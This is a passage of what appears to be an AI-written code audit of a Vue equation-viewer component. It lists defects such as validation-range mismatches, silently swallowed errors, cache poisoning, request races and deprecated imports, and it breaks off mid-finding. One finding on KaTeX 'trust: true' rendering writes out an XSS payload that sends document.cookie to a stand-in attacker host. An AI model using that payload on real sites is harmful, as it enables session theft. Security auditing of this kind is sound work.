claude-opus-5[1m]

# CHALLENGE C — CONSUMPTION · `EquationView.vue`

**Subject** `fourier-analysis/web/src/components/equation/EquationView.vue` (469 lines)
**Axis** C — how this seat consumes value.js `0.13` · keyframes `4.3` · glass-ui `^4.0.0` · the 45-operation fourier API; props/emits contract quality; integration seams.
**Method** static + source-derived only. No browser tooling. Every livable-only claim is marked `UNPROVEN-NEEDS-LIVE` (SS-13). Read whole: the SFC + all 12 files in its import closure + the two Python files behind its two operations + the installed producer `.d.ts`/`.css` surfaces.
**Posture** the component is assumed DEFECTIVE until the tree proves otherwise. Every claim below carries its own falsifier; the four superlatives carry falsifiers too (L-18 runs both ways).

**Read closure** (all read, read-only): `EquationView.vue` · `lib/equation/api.ts` · `lib/equation/types.ts` · `lib/equation/notation.ts` · `lib/api.ts` · `lib/api-problem.ts` · `lib/colors.ts` · `lib/types.ts` · `composables/useCoeffHover.ts` · `composables/useEquationCache.ts` · `FunctionInput.vue` · `EquationResult.vue` · `EquationModeToggle.vue` · `EqCoefficientsPanel.vue` · `ConvergencePlot.vue` · `lib/harmonics.ts` · `ui/SliderControl.vue` · `api/routers/equations.py` · `api/models/equations.py` · `api/main.py` · installed `@mkbabb/glass-ui@4.0.0` d.ts + token css · installed `@mkbabb/value.js@0.13.0` + producer `value.js@4.0.0` `package.json` · `katex@0.17.0` types.

**Tally** 27 defects — **4 BLOCKER** · 12 MAJOR · 11 MINOR — and **4 superlatives**.

---

## §0 — Corpus fold (hitherto; cited, not re-invented)

Folded from `formation/fourier/lane-frontend.md`, `formation/fourier/CENSUS-2026-08-03.md`, and the adjudicated `audit/codex-provenance/intakes/lane-fourier-r3-r6.md`. Where the tree disagrees I say so explicitly.

| corpus row | what it says | this challenge |
|---|---|---|
| `lane-frontend.md:130` | EquationView 469 lines, "`/equation` route shell; tabs + hover-card coefficient popovers" | **CONFIRMED** at 469 lines. |
| `lane-frontend.md:473` | `./hover-card` removed at glass-ui 5.0.0 → `<Popover>`; 2 imports, one is `EquationView.vue:9` | **CONFIRMED + SHARPENED** → D-13: the surviving seat is `HoverPopover` (`./hover-popover`, already installed at 4.0.0), not a raw `<Popover>`; EquationView hand-paints its substrate. |
| `lane-frontend.md:472` | `./metric-badge` removed at 7.0.0 → `./metric` (`Metric`); 7 imports/6 files incl. `EquationView.vue:10` | **CONFIRMED** (D-16). |
| `lane-frontend.md:480` / `CENSUS §…:38` | value.js live import surface = 5 bare-root specifiers / 4 files, easing-only; "latent, not live, while 0.13.0 remains installed" | **CONFIRMED and re-scoped** → D-10: **3 of the 5 sit inside EquationView's own import closure**. And **CONTRADICTED on one point** — see D-11: it is *not* purely latent. glass-ui 4.0.0's own `peerDependencies` reject 0.13.0 **today**. |
| `CENSUS §…:184-188` (F.W1 / F.W2) | tri-package uplift is one atomic transaction; F.W2 = "5 bare specifiers → `/easing`, delete the `colors.ts` hand-rolled arms (declared 3-line hex residual)" | **CONFIRMED as a plan; CONTRADICTED on the residual size** — D-21: the arm EquationView actually reaches (`VIZ_COLORS.amber` via `useCoeffHover.ts:65`) carries a *dead documented fallback* and a grey-on-failure mode. The residual is not 3 lines of hex; it is a live correctness contract. |
| intake `R6-8` | "an API-operation record that embeds derived client back-references cannot attribute a defect to one side of the seam"; carry → F.W5 | **CITED and instantiated** — D-05 and D-19 are exactly this shape on the `equations` pair: two magic `500`s and one `budget` range are duplicated across the seam with no join, so a break is unattributable from either side alone. |
| intake `X-3` | 45 total API operations / 30 public-non-admin / 13 admin; "the security gate is 0 of 45" | **CITED.** EquationView owns 2 of the 45 (`POST /api/equations/compute`, `POST /api/equations/simplify`). Both have client edges (so they are *not* in R3-7c's 9-operation client gap) — but see D-01/D-06: having an edge is not having a contract. |
| `lane-frontend.md:70` | `reka-ui`/`cva`/`clsx`/`tailwind-merge` are dead devDeps | **EXTENDED** → D-27: `lucide-vue-next` is the inverse defect — a **live runtime import** (`EquationView.vue:11`) declared in `devDependencies`. |
| `lane-frontend.md:624` | coverage gap: ConvergencePlot's rAF is a second ungated clock; its `reduce` block is CSS-only | **CITED, not re-litigated** (that is axis D/L territory). Consumption-relevant only insofar as EquationView is the mount that starts it. |

---

## §1 — BLOCKERS

### D-01 · BLOCKER · `budget` control range is 2× the operation's validated range → single-gesture 422, silently swallowed

**Provenance**
- `EquationView.vue:29` `const budget = ref(cached?.budget ?? 10)`
- `EquationView.vue:208` `:viz-harmonics="vizHarmonics"` → `FunctionInput.vue:217` `:max="Math.max(2, vizHarmonics ?? nHarmonics)"`
- `EquationView.vue:53-55` `vizHarmonics = autoHarmonics ? min(effectiveN, nHarmonics) : nHarmonics`
- `FunctionInput.vue:184` harmonics slider `:min="1" :max="100"` → `nHarmonics` ∈ [1, 100]
- `ui/SliderControl.vue:41-43,55` clamps to `[props.min, props.max]` — i.e. clamps *to 100*, not to the server bound
- `EquationView.vue:110` `budget: budget.value` in the compute body; `EquationView.vue:137` `simplifyCoefficients(components.value, budget.value, notation.value)`
- `api/models/equations.py:23` `budget: int = Field(default=10, ge=2, le=50)` (ComputeEquationRequest)
- `api/models/equations.py:41` `budget: int = Field(default=6, ge=2, le=50)` (SimplifyRequest)

**Claim.** The client's own "Display terms" slider offers `budget` up to **100**; both operations reject anything above **50** with a FastAPI 422. The gap is not reachable only by pathology — it is one drag of a visible control.

**Failure scenario (exact).** Load `/equation` → drag *Harmonics* to 100 (`nHarmonics=100`, `autoHarmonics→false`, so `vizHarmonics=100`) → drag *Display terms* to 51 → `watchDebounced` (`:177-181`) fires `doSimplify()` after 200 ms → `POST /api/equations/simplify` with `budget: 51` → pydantic `le=50` → **422**. `doSimplify`'s catch is `if (!isAbortError(e)) { /* silent */ }` (`:143`) — literally an empty block. `error` is never set, `simplifying` returns to `false`, and the equation card keeps rendering the previous LaTeX. **The user's control moved, the server refused, and nothing anywhere said so.** Press *Compute* in the same state and `doCompute` sends `budget: 51` too (`:110`) → 422 → `error.value = e.message`, which is empty (see D-02) → the error banner's `v-if="error"` is false → still nothing.

There is also an *automatic* path that does not require touching the budget slider. `EquationView.vue:151-159`:
```
watch(vizHarmonics, (v, oldV) => {
    if (budget.value > v) { budget.value = Math.max(2, v); }
    else if (oldV != null && oldV > 0 && budget.value <= oldV) {
        const ratio = budget.value / oldV;
        budget.value = Math.max(2, Math.round(v * ratio));
    }
});
```
With `oldV = 20`, `budget = 11`, `v = 100` → `ratio = 0.55` → `budget = 55` > 50 → 422, with the user having touched only the *Harmonics* slider. The clamp branch (`budget.value = Math.max(2, v)`) caps at `v`, which is itself up to 100 — so no branch of this watcher knows the server bound exists.

**Falsifier.** Show any clamp of `budget` to ≤ 50 on the client, or a server bound ≥ 100 on either model. Neither exists: `grep -n "50" EquationView.vue` yields no bound, `SliderControl`'s clamp is parameterised by `props.max` which is `vizHarmonics`, and both pydantic fields read `le=50` verbatim. Falsified also if `simplify`'s empty catch surfaced the error some other way — it does not; `error` is written at exactly one site, `:123`, inside `doCompute`.

**R6-8 shape.** The constraint lives in the operation record only. The client leaf carries no back-reference to it, so neither side can be blamed from its own artifacts — precisely the lesson `lane-fourier-r3-r6.md` R6-8 carries to F.W5.

---

### D-02 · BLOCKER · error surfacing collapses to the empty string — the equation operations are outside fourier's own problem+json envelope

**Provenance**
- `EquationView.vue:123` `error.value = e instanceof Error ? e.message : "Computation failed"`
- `EquationView.vue:229` `v-else-if="error && !result"` · `:243` `v-else-if="error"` — both gate on **truthiness**
- `lib/api.ts:182` `throw await ApiProblem.from(res)`
- `lib/api-problem.ts:19-31` `class ApiProblem extends Error { constructor(type, title, …) { super(title) } }` — `message === title`
- `lib/api-problem.ts:38-46` `title: typeof title === "string" ? title : response.statusText`
- `api/routers/equations.py` — **no** problem+json anywhere; `grep -rn "problem+json" api/` returns hits only in `visualizations.py:16`, `admin.py:15` and tests
- `api/main.py:114-122` the only app-level handler returns `JSONResponse(status_code=500, content={"detail": "Internal server error"})` — `application/json`, no `title`

**Claim.** Every non-2xx from `/api/equations/*` is plain `application/json`, so `ApiProblem.from` falls through to `title = response.statusText`. Over HTTP/2 `Response.statusText` is the empty string (HTTP/2 removed the reason phrase; browsers expose `""`). `super("")` ⇒ `e.message === ""` ⇒ `error.value = ""` ⇒ both `v-if`s are false ⇒ **the failure renders as nothing at all**: `computing` flips false, the previous result (or the empty state) stays on screen, and the user has no signal that a request was made and refused.

**Failure scenario.** Deploy behind HTTP/2 (the normal case for a TLS deployment). Trigger D-01's 422, or any 500 from `submit_compute_job` (a malformed expression that `parse_expression` rejects goes through `unhandled_exception_handler`). Client-side: `ApiProblem{ type:"about:blank", title:"", status:422|500, detail: undefined }` → `error.value = ""` → silent.

Compounding: the 500 handler *does* populate a usable string (`detail: "Internal server error"`), and `ApiProblem` *does* capture it (`api-problem.ts:43`) — but EquationView reads `.message` and never `.detail`, `.status`, or `.type`. `grep -rn "ApiProblem" web/src/components/equation/ web/src/lib/equation/` → **1 hit, and it is prose in a comment** (`lib/equation/api.ts:7`). The seat wires into a typed RFC 9457 error class and then throws away every field the class exists to carry, degrading it to `Error.message`.

The irony is on the record: `lib/equation/api.ts:5-8` states the E.W5 collapse was performed so there would be "one place to wire ApiProblem + RateLimit retry." The two equation operations are exactly the two that never got the envelope.

**Falsifier.** Show a problem+json exception handler covering `/api/equations/*`, or a consumer read of `ApiProblem.detail`/`.status` in the equation subtree, or a non-empty `statusText` guarantee. None exist. The HTTP/2-empty-`statusText` half is `UNPROVEN-NEEDS-LIVE` (needs a real h2 response object); the HTTP/1.1 half is provable now and is *also* defective — `title` becomes `"Unprocessable Entity"`, an unactionable string that hides the field-level `detail` array the server actually sent.

---

### D-03 · BLOCKER · user-typed `expression` reaches `katex.renderToString(…, { trust: true })` and then `v-html` — EquationView is the propagating seat

**Provenance**
- `FunctionInput.vue:98-111` free-text `<input v-model="expression">`, `spellcheck="false"`, no validation
- `EquationView.vue:199` `v-model:expression="expression"` — EquationView owns the ref
- `EquationView.vue:315` `:expression="expression"` — EquationView hands the raw string across a prop boundary
- `ConvergencePlot.vue:256` `katex.renderToString(latex, { throwOnError: false, displayMode: false })` inside `renderKatexInline`
- `ConvergencePlot.vue:263-264` `renderKatexInline(\`f(x) = ${props.expression ?? …}\`)`
- `ConvergencePlot.vue:353` `v-html="tooltipHtml"`
- `EquationResult.vue:20-24` the sibling path: `katex.renderToString(props.latex, { …, trust: true })` → `:37` `v-html="renderedHtml"`; `EquationView.vue:255` `<EquationResult :latex="activeLatex" />`
- `useCoeffHover.ts:99-101` third site, also `trust: true` → `EquationView.vue:264` `v-html="popoverHtml"`
- `katex@0.17.0` `types/katex.d.ts:176-186`: *"If `false` (do not trust input), prevent any commands like `\includegraphics` that could enable adverse behavior… **If `true` (trust input), allow all such commands.**"* `@default false`.

**Claim.** `trust: true` re-enables KaTeX's URL-bearing commands (`\href`, `\url`, `\includegraphics`). `throwOnError: false` does **not** mitigate this — it changes handling of *unknown* commands; `\href` is a *known* command gated solely by `trust`. EquationView is the component that (a) owns the untrusted string and (b) passes it, unsanitised, into a `trust:true` renderer whose output is `v-html`'d.

**Failure scenario.** Type `x \href{javascript:fetch('//evil/'+document.cookie)}{ }` into the Expression field, hover the sum/original curve on the convergence plot → `tooltipHtml` contains a live `<a href="javascript:…">` injected via `v-html`. The string also round-trips through `sessionStorage` (`useEquationCache.ts:33`, key `eq-tab-state-v2`), so it survives reload. Currently self-XSS; it becomes cross-user the moment any equation state is shareable — and the repo already has a `/v/:visualizationSlug` sharing surface and a `visualizations` CRUD entity.

**Falsifier.** Show a sanitiser between the input and the renderer, or `trust` set to a protocol-filtering function (KaTeX's documented mitigation, `katex.d.ts:180-181` "Provide a custom function `handler(context)`"), or evidence that `expression` is validated before binding. `grep -rn "trust" web/src/components/equation/` → three sites, all `trust: true`, zero handlers. Falsified for the `EquationResult`/`useCoeffHover` legs specifically if `latex`/`popoverHtml` are provably server- or numeric-only (they are: `latex` comes from the API, `popoverHtml` from `toFixed`) — **but the `ConvergencePlot` leg is client-string interpolation and is not falsified.** Severity stays BLOCKER on that leg.

---

### D-04 · BLOCKER · unvalidated `JSON.parse` of `sessionStorage` into `ComputeEquationResponse`; the unguarded field access white-screens the route with no recovery path

**Provenance**
- `useEquationCache.ts:36-41` `loadCachedResult()` — `JSON.parse(raw)` returned as `CachedResult` with **zero** shape validation
- `EquationView.vue:36-37` `const cachedRes = loadCachedResult(); const result = ref(cachedRes?.result ?? null)`
- `EquationView.vue:59-67`
  ```
  const components = computed<BasisComponent[]>(() => {
      if (!result.value) return [];
      return result.value.coefficients.map((c: FourierTermDTO) => ({ … }));
  });
  ```
  — guards the *object*, not the *field*
- `EquationView.vue:174` `if (!result.value) doCompute();` — the only bootstrap, gated on the same object check
- `EquationView.vue:72` `result.value?.coefficients ?? []` — the *correct* guard, three lines below the broken one, on the same field

**Claim.** A `sessionStorage` entry that parses as JSON but lacks `result.coefficients` produces `result.value = {}` (truthy) → `components` throws `TypeError: Cannot read properties of undefined (reading 'map')` during the render pass → the `/equation` route mounts to a blank surface. Because `doCompute` is gated on `!result.value` (`:174`) and the poisoned entry is truthy, **no recompute ever runs and the state persists for the whole session tab**. There is no clear-cache affordance in the UI.

**Failure scenario.** Any partial/interrupted `sessionStorage` write (`useEquationCache.ts:48` is a single `setItem` of a ~40 KB string, wrapped in a catch that swallows `QuotaExceededError`), any manual/extension edit, or any future API field rename that drops `coefficients` while the `-v2` key stays. The key is versioned; the *shape* is not checked. Ship a v3 response and the v2 key still deserialises into the v3 code path.

**Falsifier.** Show a validator, a `zod`/schema parse, or a `coefficients` guard on line 61. `useEquationCache.ts` has no validation of any kind — its try/catch guards `JSON.parse` throwing, not the parsed value's shape. Falsified if Vue's render-error boundary recovers — it does not by default, and `grep -rn "onErrorCaptured\|errorHandler" web/src/` would need to show one covering this subtree.

This is the exact failure family value.js's own W44 "born-RED blank" records in the project ledger — an unvalidated cached object producing an empty mount.

---

## §2 — MAJOR

### D-05 · MAJOR · `notation` is inert in the default display mode — `latex_sigma` is never refreshed by the cheap path

**Provenance**
- `EquationView.vue:43` `const eqMode = ref<EquationDisplayMode>("sigma")` — **sigma is the default**
- `EquationView.vue:49-51` `activeLatex = eqMode === "sigma" && displayLatexSigma ? displayLatexSigma : displayLatex`
- `EquationView.vue:114` `displayLatexSigma.value = result.value.latex_sigma` — written **only** inside `doCompute`
- `EquationView.vue:138` `displayLatex.value = resp.latex` — `doSimplify` writes **only** the expanded form
- `lib/equation/types.ts:42-46` `SimplifyResponse { latex; energy_captured; term_count }` — **no `latex_sigma`**
- `api/models/equations.py:44-47` — server agrees; no `latex_sigma` on the simplify response
- `api/routers/equations.py:97` `latex_sigma = render_latex_sigma(terms, req.notation)` — the sigma form **is** notation-dependent
- `EquationView.vue:177-181` `watchDebounced([notation, budget], () => { if (result.value) doSimplify(); }, { debounce: 200 })` — comment at `:176` reads *"Cheap re-render on notation/budget change"*

**Claim.** In the default `sigma` mode, `activeLatex` is `displayLatexSigma`, which only `doCompute` writes. Changing the Notation pill fires `doSimplify`, which updates `displayLatex` — a value the sigma view never reads. **The Notation control produces no visible change until the user presses Compute.** The `budget` control is inert in sigma mode too, but that one is at least *documented* (`FunctionInput.vue:215` subtitle "shown in expanded (a+b) view") and is inert by backend construction (`render_latex_sigma(terms, notation)` takes no budget). The notation case has no such excuse: the backend renders sigma per-notation, and the cheap path simply doesn't ask for it.

**Failure scenario.** Load `/equation` (sigma default) → click *Exp* → 200 ms later a `POST /simplify` fires and succeeds → the pill shows Exp, `lastDisplayKey` advances to `…|exponential|10` → the rendered equation is still trigonometric. Click *Polar* → same. The state machine now believes the display is current for polar (`lastDisplayKey` matches), so any later `doSimplify` early-returns at `:133`. The displayed notation and the selected notation diverge permanently.

**Falsifier.** Show `latex_sigma` on `SimplifyResponse`, or a `displayLatexSigma` write outside `doCompute`, or `eqMode` defaulting to `expanded`. None hold — the field appears at exactly two lines in the SFC (`:39` init, `:114` in `doCompute`) and is absent from both the TS and pydantic simplify models.

### D-06 · MAJOR · `compute` and `simplify` race on `displayLatex` — independent abort keys, no generation guard

**Provenance**
- `lib/equation/api.ts:27` abort key `"eq-compute"` · `:51` abort key `"eq-simplify"`
- `lib/api.ts:52-59` `abortable(key)` aborts only the *same-key* inflight controller
- `EquationView.vue:113` `displayLatex.value = result.value.latex` (compute) · `:138` `displayLatex.value = resp.latex` (simplify) — two writers, no sequencing
- `EquationView.vue:116-118` the acknowledged ordering hazard: `lastDisplayKey = displayKey()` captured before `effectiveN` updates

**Claim.** A compute and a simplify can be in flight simultaneously (different keys ⇒ neither aborts the other) and both write `displayLatex`. Last writer wins, and there is no request-generation counter.

**Failure scenario A (stale coefficients).** Press Compute; while it is in flight, nudge the notation pill → 200 ms later `doSimplify` sends `components.value` — the *old* result's coefficients (`components` is evaluated at call time, `:137`). If simplify resolves after compute, `displayLatex` holds the LaTeX of the **previous function** while `ConvergencePlot` (`:311-312`, bound to `result.original_points`/`result.coefficients`) plots the **new** one. The equation and the plot disagree.

**Failure scenario B (sticky wrong notation).** Same interleave, opposite resolution order. `doCompute` resolves last and at `:118` writes `lastDisplayKey = displayKey()` — which reads the **current** `notation.value` (already changed mid-flight) joined to the **new** `lastComputeKey`. `displayLatex`/`displayLatexSigma` hold the *pre-change* notation from the response body. `doSimplify` will now early-return at `:133` because `key === lastDisplayKey`. The mismatch is sticky until some other input changes.

**Falsifier.** Show a shared abort key, a generation token, or an `await`-ordering guard. `grep -n "abortInflight\|generation\|seq" EquationView.vue` → nothing. `lib/api.ts:61-66` exports `abortInflight(keys)` — the tool exists and this seat never calls it. The `:116-118` comment proves the author saw the ordering hazard on one axis and stopped one step short of the general fix.

### D-07 · MAJOR · dead reactive state — `loading` has zero consumers, so the simplify round-trip is invisible

**Provenance**
- `EquationView.vue:57` `const loading = computed(() => computing.value || simplifying.value);`
- `grep -n "loading\|simplifying" EquationView.vue` → `:34`, `:57`, `:135`, `:145` **only**. The template uses `computing` (`:221`, `:239`) and never `loading`.

**Claim.** `loading` is unreferenced; therefore `simplifying` — its only other reader — reaches no pixel. The 200 ms-debounced simplify round-trip (a real network request, up to ~15 KB of coefficients uploaded) has **no** progress indication anywhere in the template. `<script setup>` does not tree-shake unreferenced top-level computeds, so this also ships a live effect scope for nothing.

**Falsifier.** Find `loading` in the template or in any child binding. It appears nowhere in `EquationView.vue` after line 57, and it is not exposed (no `defineExpose`).

### D-08 · MAJOR · `HoverCard` + a 13-declaration **global** stylesheet reimplement `HoverPopover`, which is already installed

**Provenance**
- `EquationView.vue:9` `import { HoverCard, HoverCardTrigger, HoverCardContent } from "@mkbabb/glass-ui/hover-card"`
- `EquationView.vue:274` `<HoverCard :open-delay="200" :close-delay="150">` · `:282` `side="bottom" :side-offset="6" :collision-padding="12" align="end"`
- `EquationView.vue:455-469` — a **non-scoped** `<style>` block defining `.info-hovercard` with `z-index`, `width`, `padding`, `color`, `background`, `border`, `border-radius`, `box-shadow`, `animation`, `user-select`
- installed `@mkbabb/glass-ui@4.0.0` exports `./hover-popover`; `dist/components/custom/hover-popover/HoverPopover.vue.d.ts:1-50` — *"a popover-tier substrate (glass + border + radius) at tooltip cadence: hover-trigger, defer-on-leave timer, adaptive `side`/`align` that auto-flips off viewport edges"*, props `content` / `side` / `align` / `hoverOpenDelay` / `closeDelay` / `sideOffset`
- `lane-frontend.md:473` — `./hover-card` is **removed at glass-ui 5.0.0**

**Claim.** The design system ships, at the *installed* version, a component whose prop surface is a one-to-one match for what EquationView passes to `HoverCard` (`side`, `align`, `sideOffset`, open/close delays) and whose stated purpose is exactly the substrate the consumer hand-paints in global CSS. EquationView instead picked the primitive that gets **deleted at 5.0.0** and re-authored the surface by hand. Worse, the re-authoring is **unscoped**: `.info-hovercard` is a global selector emitted by a component, so any element with that class anywhere in the app inherits it, and the rule's specificity/order is load-dependent.

**Falsifier.** Show that `HoverPopover` cannot host the two-row content (a tier chip + `MetricBadge`, then an `Info` line). Its d.ts documents *"Pass a default slot for richer content (kbd hints, secondary lines)"* — it can. Falsified also if `./hover-popover` were absent at 4.0.0; `ls node_modules/@mkbabb/glass-ui/dist/components/custom/hover-popover/` shows `HoverPopover.vue.d.ts` + `index.d.ts` present.

### D-09 · MAJOR · `.cartoon-card` × 5 — the component is built on a glass-ui recipe the design system deleted

**Provenance**
- `EquationView.vue:230`, `:239`, `:243`, `:251`, `:308` — five `.cartoon-card` application sites (`grep -c` → 5)
- `node_modules/@mkbabb/glass-ui/dist/styles/cards.css:2-3` — *"`.cartoon-card` + `.elevated-card` recipe classes were **removed at C.W5** per the W0 overfitting audit (Card's tier system covers both)"*
- `web/src/style.css:98-110` — the consumer-side resurrection shim: `@utility cartoon-card { @apply cartoon-surface; border-color: var(--border); background: var(--card); }`, self-described as *"the dead-class resurrection"* and *"the fourier-local KISS stop-gap"*, with a "cross-repo re-publish recorded as a coordination ask"

**Claim.** EquationView's entire card chrome rests on a class the producer removed and the consumer resurrected. The shim is honest and well-documented — that is not the defect. The defect is that the *consumption* was never migrated: the producer's stated replacement is `Card`'s tier system, and EquationView uses raw `<div class="cartoon-card">` five times instead. The shim converts a compile-time break into an indefinitely-deferred one, and the `@utility` directive means it silently stops working the day glass-ui reintroduces the name with different semantics.

**Falsifier.** Show `.cartoon-card` still shipping from glass-ui 4.0.0. `grep -rn "cartoon-card" node_modules/@mkbabb/glass-ui/dist/styles/cards.css` returns only the removal comment. Falsified as a *consumption* claim if `<Card>` cannot express the surface — it can; `./card` is in the 4.0.0 exports map and the producer names it as the successor.

### D-10 · MAJOR · 3 of the repo's 5 value.js bare-root specifiers live inside EquationView's import closure

**Provenance** (`grep -rn 'from "@mkbabb/value.js"' web/src/` → 5 hits)
- `components/equation/ConvergencePlot.vue:5` — EquationView's direct child (`:309`)
- `components/equation/composables/useCurveTransition.ts:8` — pulled by `ConvergencePlot.vue:11`
- `components/equation/lib/harmonics.ts:5` — pulled by `ConvergencePlot.vue:10`
- (the other two are `lib/easings.ts:9,16`, outside this subtree)
- installed `@mkbabb/value.js@0.13.0` `exports` = `{ ".": { types, import, default } }`
- producer `value.js@4.0.0` `exports` = `{ "./color", "./value", "./css", "./easing", "./math", "./transform", "./quantize" }` — **no `"."`**

**Claim.** The root export is deleted at 4.0.0. Every one of these three resolves through it. The moment F.W1's atomic tri-package uplift lands, EquationView's plot subtree fails to resolve — three of the five repo-wide breakages are concentrated here, in one component's closure, all for the single symbol `easeInOutSine`. The F.W2 target (`@mkbabb/value.js/easing`) is a mechanical rewrite of three lines.

**Falsifier.** Show a `"."` key in value.js 4.0.0's exports map, or a `main`/`module` fallback (Node ignores those once `exports` is present). Neither is there. Corroborates `CENSUS §…:38` and `lane-frontend.md:480`, re-scoped to this component.

### D-11 · MAJOR · the installed value.js **already violates** glass-ui 4.0.0's peer range — *contradicting* the corpus's "latent, not live" framing

**Provenance**
- `web/package.json` deps: `"@mkbabb/value.js": "^0.13.0"`; installed `node_modules/@mkbabb/value.js/package.json` → `0.13.0`
- installed `node_modules/@mkbabb/glass-ui/package.json` `peerDependencies` → `"@mkbabb/value.js": "^0.10.0 || ^0.11.0"`
- `web/package.json` has **no** `overrides`, `resolutions`, or `pnpm.peerDependencyRules` (all three read `None`)

**Claim.** For pre-1.0 versions npm's caret pins the minor: `^0.10.0` ≡ `>=0.10.0 <0.11.0`, `^0.11.0` ≡ `>=0.11.0 <0.12.0`. **0.13.0 satisfies neither.** The peer constraint is unmet *today*, at the current pins, with no override suppressing it.

**Contradiction, stated explicitly.** `CENSUS-2026-08-03.md` line 38 characterises the value.js situation as *"latent, not live, while 0.13.0 remains installed"*, and `lane-frontend.md:480` frames the peer problem as forward-looking ("7.0 peers `@mkbabb/value.js@^4.0.0`; installed 0.13.0"). Both are correct about the *4.0.0 root-export* break being latent (D-10). Neither notices that the **4.0.0 → 0.13.0** peer edge is already red. The tree disagrees with the corpus here and the tree wins: the constraint is in the installed package's own metadata.

**Falsifier.** Show an override/resolution, or a peer range admitting 0.13.0. Neither exists. `UNPROVEN-NEEDS-LIVE` only for whether the installer *warned* (that depends on the package manager and is not recoverable from the tree); the constraint violation itself is proven from the two `package.json`s.

### D-12 · MAJOR · two of the four glass-ui imports are on the producer's deletion list

**Provenance**
- `EquationView.vue:9` `HoverCard` → removed at 5.0.0 (`lane-frontend.md:473`; `CHANGELOG.md:216` per that row)
- `EquationView.vue:10` `MetricBadge` → removed at 7.0.0, successor `Metric` from `./metric` (`lane-frontend.md:472`)
- surviving: `:8` `Button` (`./button`), `:13` `SegmentedTabs` (`./tabs`, confirmed exported at 4.0.0 via `dist/components/custom/tabs/index.d.ts:1`)

**Claim.** 50 % of this seat's glass-ui import surface is scheduled for deletion inside the single atomic uplift the census books as F.W1. EquationView is therefore a *gating* component for that transaction, not a follower.

**Falsifier.** Show either symbol surviving at 7.0.0. Both are corpus rows with `CHANGELOG` provenance; the installed 4.0.0 still exports `./hover-card` and `./metric-badge`, which is exactly why this is MAJOR-now rather than BLOCKER-now.

### D-13 · MAJOR · triple breakpoint authority at 1024 px, with a reachable dead band in [1023, 1024)

**Provenance**
- `EquationView.vue:45` `const isDesktop = useMediaQuery("(min-width: 1024px)")` — JS authority
- `EquationView.vue:187` `class="… lg:hidden"` — Tailwind authority (`lg` is config-owned)
- `EquationView.vue:196`/`:219` `:class="{ 'panel-inactive': mobileView !== '…' && !isDesktop }"`
- `EquationView.vue:437-441` `@media (max-width: 1023px) { .panel-inactive { display: none } }` — CSS authority
- plus `:338`, `:349`, `:350`, `:361`, `:362`, `:371`, `:376` — seven more hand-written breakpoints

**Claim.** One layout decision is expressed three times in two languages with two different numeric conventions (`min-width: 1024` vs `max-width: 1023`). The `.panel-inactive` *class* is applied by the JS authority but only *has an effect* under the CSS authority, and the two do not tile: at a viewport width `w` with `1023 < w < 1024` (reachable via browser zoom, fractional device pixel ratios, and OS display scaling, all of which produce fractional CSS px), `matchMedia("(min-width:1024px)")` is **false** (so the class is applied) while `@media (max-width:1023px)` is also **false** (so `display:none` never lands). Both panels render, in the mobile flex column, simultaneously.

**Failure scenario.** 1023.5 px viewport, `mobileView = "controls"` → the right panel carries `.panel-inactive` with no rule behind it → the convergence plot and its rAF loop mount below the controls in a layout never designed for it. `UNPROVEN-NEEDS-LIVE` for the visual outcome; the media-query gap is provable statically.

**Falsifier.** Show the CSS using `max-width: 1023.98px` (the standard mitigation) or `not all and (min-width: 1024px)`, or the JS and CSS sharing one token. It uses the bare integer `1023`, and `useMediaQuery` hardcodes `1024` in a string literal. Falsified also if `SegmentedTabs`'s own `responsive` prop were used — it is not (see D-24), and it would have collapsed all three authorities into one.

### D-14 · MAJOR · `reconstructed_points` is dead payload — computed, serialised, cached, never read; and the reconstruction is duplicated client-side

**Provenance**
- `lib/equation/types.ts:31` `reconstructed_points: { x: number[]; y: number[] }`
- `api/routers/equations.py:100-105` the server builds it: a full complex reconstruction loop over every term
- `api/routers/equations.py:126` it is returned on every `/compute`
- `grep -rn "reconstructed_points\|reconstructedPoints" web/src/ web/e2e/` → **1 hit, the type declaration.** Zero consumers.
- `EquationView.vue:120`/`:141` `saveCachedResult(result.value, …)` → `useEquationCache.ts:48` `JSON.stringify({ result: r, … })` — the dead array is written to `sessionStorage` too
- `ConvergencePlot.vue:159-163` recomputes the full sum client-side from `coefficients`

**Claim.** Every `/compute` response carries `n_eval_points` (500) float64s the client never reads, then persists them to `sessionStorage`. At full JSON float precision that is ≈10 KB of wire + storage per request, for nothing. Simultaneously, the reconstruction math exists on **both** sides of the seam (`equations.py:100-105` and `ConvergencePlot.vue:159-163`) with no test tying them together — so they can silently diverge, and the side that is authoritative is the one that is never transmitted's twin.

**Falsifier.** Find any read of the field. The grep is exhaustive over `web/src` and `web/e2e`. Falsified if the field is contractually required by another client — `grep -rn "reconstructed" api/` would need to show a second consumer; the repo has one web client.

### D-15 · MAJOR · `simplifyCoefficients` takes a foreign domain type, forcing a DTO→BasisComponent→DTO round-trip and a self-inflicted cast

**Provenance**
- `EquationView.vue:59-67` maps `FourierTermDTO` → `BasisComponent` (`{ index, coefficient: [re,im], amplitude, phase }`)
- `lib/types.ts:1-6` `BasisComponent` — the *epicycle/basis-decomposition* domain type, not the equation domain
- `lib/equation/api.ts:38-44` maps `BasisComponent` **straight back** to `FourierTermDTO`
- `EquationView.vue:72` `const coefficients = computed(() => result.value?.coefficients ?? [])` — the raw DTOs are already sitting right there, and are already passed to `useCoeffHover` (`:76`)
- `lib/equation/api.ts:36` `notation: string` — the parameter is typed **wider** than the caller's value
- `lib/equation/api.ts:49` `notation: notation as SimplifyRequest["notation"]` — a cast that exists **only** because of line 36

**Claim.** The client wrapper for one of the 45 operations declines the operation's own DTO in favour of a type from a different feature domain, then converts back. The conversion is lossless and therefore pure waste. And the `notation` parameter is declared `string` even though every caller (`EquationView.vue:137`) passes a well-typed `NotationMode` — which manufactures the `as` cast at `:49`. The file's own header (`:4`) celebrates retiring "the 2 `as unknown as` casts"; it left behind a third cast that its own signature creates.

**Falsifier.** Show a caller that has `BasisComponent`s but not `FourierTermDTO`s. `grep -rn "simplifyCoefficients" web/src/` → one call site, `EquationView.vue:137`, which holds both. Falsified for the cast half if `NotationMode` were not importable in `lib/equation/api.ts` — it is; the file already imports from `./types` at `:14-20`.

### D-16 · MAJOR · `useCoeffHover`'s documented amber fallback is unreachable, and the real failure mode is a grey popover

**Provenance**
- `useCoeffHover.ts:60-65`
  ```
  // D.W4.d — KaTeX cannot resolve CSS vars; read the resolved
  // `--viz-amber` hex via VIZ_COLORS at render time … The
  // STATIC.golden constant is the canonical fallback used when
  // `resolveVizColors` has not yet run (mounted before paint).
  const amber = VIZ_COLORS.amber || VIZ_COLORS.golden;
  ```
